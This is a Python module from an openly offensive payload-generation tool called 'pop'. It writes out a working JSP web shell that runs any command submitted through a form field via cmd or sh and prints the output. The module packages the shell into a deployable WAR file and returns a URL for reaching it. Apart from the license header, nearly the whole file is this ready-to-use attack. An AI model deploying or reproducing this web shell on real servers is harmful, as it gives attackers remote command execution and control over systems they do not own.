#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import zipfile


USAGE = ''
NARGS = [0, 0]
LANG = 'jsp'
EXEC = ''


pl = '''
<%@ page import="java.io.*,java.util.*"%><form method=get><input name=VAR0 type=text><input type=submit value=go></form><% String VAR1=request.getParameter("VAR0");if(VAR1!=null){Process VAR2=Runtime.getRuntime().exec((System.getProperty("os.name").startsWith("Windows")?new String[]{"cmd","/c",VAR1}:new String[]{"sh","-c",VAR1}));DataInputStream VAR3=new DataInputStream(VAR2.getInputStream());String VAR4;while((VAR4=VAR3.readLine())!=null){out.println(VAR4);}} %>
'''

def g(s, args, dst, url):
    global pl

    with zipfile.ZipFile('{}/war-get.war'.format(dst), 'w') as z:
        z.writestr('META-INF/MANIFEST.MF', '\r\n'.join([
            'Manifest-Version: 1.0',
            'Created-By: 1.8.0_102 (Oracle Corporation)',
        ]))
        z.writestr('index.jsp', pl)

    pl = ['war-get.war']
    return '\n'.join([url + e for e in pl])
